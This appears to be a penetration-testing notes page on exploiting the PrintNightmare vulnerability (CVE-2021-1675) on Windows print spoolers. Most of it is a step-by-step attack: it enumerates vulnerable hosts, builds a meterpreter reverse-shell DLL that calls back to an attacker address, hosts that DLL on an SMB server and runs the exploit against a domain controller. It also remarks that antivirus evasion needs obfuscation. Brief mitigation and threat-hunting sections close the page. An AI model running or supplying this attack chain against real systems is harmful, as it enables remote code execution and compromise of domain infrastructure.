# PrintNightmare (CVE-2021-1675)

[CVE-2021-1675](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675) is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}

## Get vulnerable hosts

Check if there are some targetable computers.&#x20;

```bash
impacket-rpcdump @$TARGET_IP | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```



## Setup the prerequisites

Then, we have to install another version of impacket&#x20;

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Now copy the script bellow into a file (`cve-2021-1675.py`):

{% embed url="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py" %}

Create a payload to host in our SMB server.

{% code title="print.dll" overflow="wrap" %}
```bash
msfvenom -p windows/x64/metepreter/reverse_tcp LHOST=$ATT_IP LPORT=$ATT_PORT -f dll > print.dll
```
{% endcode %}

Start a metasploit multi/handler

```bash
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/metepreter/reverse_tcp
set LHOST $ATT_IP
set LPORT $ATT_PORT
run
```

And now start a SMB server with impacket-smbserver tool to host the malicious payload.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support 
```



### Run the exploit

{% code overflow="wrap" %}
```bash
python3 cve-2021-1675.py $DOMAIN.local/$USER:$PASS@$DC_IP '\\$SMB_SERVER_IP\smbFolder\print.dll'
```
{% endcode %}

This command below should starts a metepreter session in our multi/handler

{% hint style="warning" %}
This doesn't works without obfuscation if there are some AVs.
{% endhint %}



## Mitigation

To mitigation this vulnerability we have to disable spooler service on the PCs

{% code title="Powershell commands" overflow="wrap" %}
```powershell
Stop-Service Spooler

REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```
{% endcode %}



## Threat Hunting

* Search in this folders to find suspicious `.dll` file.

```
C:\Windows\System32\spool\drivers\x64\3\
C:\Windows\system32\spool\drivers\x64\3\Old\
```

* Hunt for suspicious `spoolsv.exe` child processes (`cmd.exe`, `powershell.exe`, etc.)
* **Search for DLLs** that are part of the proof-of-concept codes that were made public, such as `MyExploit.dll`, `evil.dll`, `addCube.dll`, `rev.dll`, `rev2.dll`, `main64.dll`, `mimilib.dll`. If they're present on the endpoint, you can find them with **Event ID 808** in **Microsoft-Windows-PrintService**.



